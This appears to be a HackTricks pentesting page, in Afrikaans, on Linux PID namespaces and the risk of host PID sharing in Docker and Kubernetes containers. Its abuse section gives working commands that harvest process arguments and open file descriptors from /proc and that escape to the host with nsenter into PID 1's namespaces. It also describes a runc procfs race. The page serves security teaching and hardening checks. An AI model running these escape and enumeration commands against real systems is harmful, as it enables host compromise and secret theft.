# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID namespace beheer hoe prosesse genommer word en watter prosesse sigbaar is. Daarom kan 'n container sy eie PID 1 hê, selfs al is dit nie 'n werklike masjien nie. Binne die namespace sien die workload wat soos 'n plaaslike prosesboom lyk. Buite die namespace sien die host steeds die werklike host-PID's en die volledige proseslandskap.

Vanuit 'n security-oogpunt is die PID namespace belangrik omdat prosessigbaarheid waardevol is. Sodra 'n workload host-prosesse kan sien, kan dit moontlik diensname, command-line arguments, secrets wat in prosesargumente deurgegee word, omgewing-afgeleide toestand deur `/proc`, en moontlike namespace-entry-teikens waarneem. As dit meer kan doen as om net daardie prosesse te sien, byvoorbeeld deur signals te stuur of ptrace onder die regte omstandighede te gebruik, word die probleem baie ernstiger.

## Werking

'n Nuwe PID namespace begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word vanuit die namespace se oogpunt PID 1, wat ook beteken dat dit spesiale init-agtige semantics vir orphaned children en signal-gedrag kry. Dit verduidelik baie van die container-afwykings rondom init-prosesse, zombie-reaping, en waarom klein init-wrappers soms in containers gebruik word.

Die belangrike security-les is dat 'n proses geïsoleerd kan lyk omdat dit slegs sy eie PID-boom sien, maar dat hierdie isolasie doelbewus verwyder kan word. Docker stel dit bloot deur `--pid=host`, terwyl Kubernetes dit deur `hostPID: true` doen. Sodra die container by die host se PID namespace aansluit, sien die workload host-prosesse direk, en word baie latere attack paths veel meer realisties.

## Lab

Om 'n PID namespace handmatig te skep:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sien nou ’n private proses-aansig. Die `--mount-proc` flag is belangrik omdat dit ’n procfs-instansie mount wat by die nuwe PID namespace pas, sodat die proseslys van binne af samehangend is.

Om container-gedrag te vergelyk:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Die verskil is onmiddellik en maklik om te verstaan, en daarom is dit ’n goeie eerste lab vir lesers.

## Runtime-gebruik

Normale containers in Docker, Podman, containerd en CRI-O kry hul eie PID namespace. Kubernetes Pods ontvang gewoonlik ook ’n geïsoleerde PID-aansig, tensy die workload uitdruklik vir host-PID-deling vra. LXC/Incus-omgewings maak op dieselfde kernel-primitief staat, hoewel system-container-gebruiksgevalle meer ingewikkelde prosesbome kan blootlê en meer debugging-kortpaaie kan aanmoedig.

Dieselfde reël geld oral: as die runtime gekies het om die PID namespace nie te isoleer nie, is dit ’n doelbewuste vermindering van die container-grens.

## Misconfigurasies

Die kanonieke misconfigurasie is host-PID-deling. Spanne regverdig dit dikwels vir debugging-, monitoring- of diensbestuur-gerief, maar dit moet altyd as ’n betekenisvolle security-uitsondering hanteer word. Selfs al het die container geen onmiddellike write primitive oor host-prosesse nie, kan sigbaarheid alleen baie oor die stelsel openbaar. Sodra capabilities soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, brei die risiko aansienlik uit.

Nog ’n fout is om aan te neem dat host-PID-deling onskadelik is omdat die workload nie by verstek host-prosesse kan kill of ptrace nie. Daardie gevolgtrekking ignoreer die waarde van enumeration, die beskikbaarheid van namespace-entry-teikens en die manier waarop PID-sigbaarheid met ander verswakte kontroles kombineer.

## Misbruik

As die host PID namespace gedeel word, kan ’n attacker host-prosesse inspekteer, prosesargumente harvest, interessante dienste identifiseer, kandidaat-PIDs vir `nsenter` opspoor, of prosessigbaarheid met ptrace-verwante privilege kombineer om met host- of naburige workloads in te meng. In sommige gevalle is dit genoeg om bloot die regte langlopende proses te sien om die res van die attack plan aan te pas.

Die eerste praktiese stap is altyd om te bevestig dat host-prosesse werklik sigbaar is:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sodra host-PID's sigbaar is, word prosesargumente en teikens vir namespace-betreding dikwels die nuttigste bron van inligting:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Indien `nsenter` beskikbaar is en voldoende voorregte bestaan, toets of ’n sigbare gasheerproses as ’n namespace-brug gebruik kan word:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selfs wanneer toegang geblokkeer word, is host PID-sharing reeds waardevol omdat dit die diensuitleg, runtime-komponente en moontlike bevoorregte prosesse onthul wat volgende geteiken kan word.

Host PID-sigbaarheid maak file-descriptor-misbruik ook meer realisties. Indien ’n bevoorregte host-proses of naburige workload ’n sensitiewe lêer of socket oop het, kan die attacker moontlik `/proc/<pid>/fd/` inspekteer en daardie handle hergebruik, afhangend van eienaarskap, procfs-mountopsies en die teikendiensmodel.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Hierdie opdragte is nuttig omdat hulle aandui of `hidepid=1` of `hidepid=2` kruis-proses-sigbaarheid verminder en of ooglopend interessante descriptors, soos oop secret files, logs of Unix sockets, hoegenaamd sigbaar is.

### Volledige voorbeeld: host PID + `nsenter`

Host PID-sharing word ’n direkte host escape wanneer die proses ook genoeg privilege het om by die host namespaces aan te sluit:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
As die opdrag slaag, voer die container-proses nou in die host se mount-, UTS-, netwerk-, IPC- en PID-namespaces uit. Die impak is onmiddellike host-compromise.

Selfs wanneer `nsenter` self ontbreek, kan dieselfde resultaat moontlik deur die host-binary bereik word indien die host-lêerstelsel gemount is:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Onlangse Runtime-notas

Sommige aanvalle wat met PID-namespace verband hou, is nie tradisionele `hostPID: true`-wanopstellings nie, maar runtime-implementasiefoute rondom hoe procfs-beskermings tydens container-opstelling toegepas word.

#### `maskedPaths`-rentoestand na host procfs

In kwesbare `runc`-weergawes kon aanvallers wat die container-image of `runc exec`-werklas kon beheer, die maskeringsfase omseil deur die container-kant se `/dev/null` te vervang met ’n simboliese skakel na ’n sensitiewe procfs-pad soos `/proc/sys/kernel/core_pattern`. Indien die rentoestand suksesvol was, kon die bind mount vir die gemaskerde pad op die verkeerde teiken land en host-wye procfs-instellings aan die nuwe container blootstel.

Nuttige hersieningsopdrag:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dit is belangrik omdat die uiteindelike impak dieselfde as ’n direkte procfs-blootstelling kan wees: ’n skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur host code execution of denial of service.

#### Namespace injection met `insject`

Namespace injection tools soos `insject` wys dat interaksie met ’n PID-namespace nie altyd vereis dat die target namespace vooraf betree word voordat die proses geskep word nie. ’n Helper kan later attach, `setns()` gebruik en uitvoer terwyl sigbaarheid in die target PID-space behoue bly:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Hierdie soort tegniek is hoofsaaklik relevant vir gevorderde debugging, offensive tooling en post-exploitation workflows waar namespace-konteks aangesluit moet word nadat die runtime reeds die workload geïnitialiseer het.

### Verwante FD Abuse Patterns

Twee patrone verdien spesifiek vermelding wanneer host-PIDs sigbaar is. Eerstens kan ’n geprivilegeerde proses ’n sensitiewe file descriptor oop hou oor `execve()` heen omdat dit nie met `O_CLOEXEC` gemerk is nie. Tweedens kan dienste file descriptors oor Unix-sockets deur middel van `SCM_RIGHTS` oordra. In albei gevalle is die interessante objek nie meer die pathname nie, maar die reeds oopgemaakte handle wat ’n proses met laer privileges kan erf of ontvang.

Dit is belangrik in container-werk omdat die handle na `docker.sock`, ’n geprivilegeerde log, ’n host-secret file of ’n ander hoëwaarde-objek kan wys, selfs wanneer die path self nie direk vanaf die container-filesystem bereikbaar is nie.

## Kontroles

Die doel van hierdie commands is om vas te stel of die proses ’n private PID-view het en of dit reeds ’n veel breër proseslandskap kan enumerate.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Wat hier interessant is:

- As die process list ooglopend host services bevat, is host PID sharing waarskynlik reeds aktief.
- Om slegs ’n klein container-local tree te sien, is die normale baseline; om `systemd`, `dockerd` of onverwante daemons te sien, is dit nie.
- Sodra host PIDs sigbaar is, word selfs read-only process information nuttige verkenning.

As jy ontdek dat ’n container met host PID sharing loop, moenie dit as slegs ’n kosmetiese verskil beskou nie. Dit is ’n groot verandering in wat die workload kan waarneem en moontlik kan beïnvloed.
{{#include ../../../../../banners/hacktricks-training.md}}
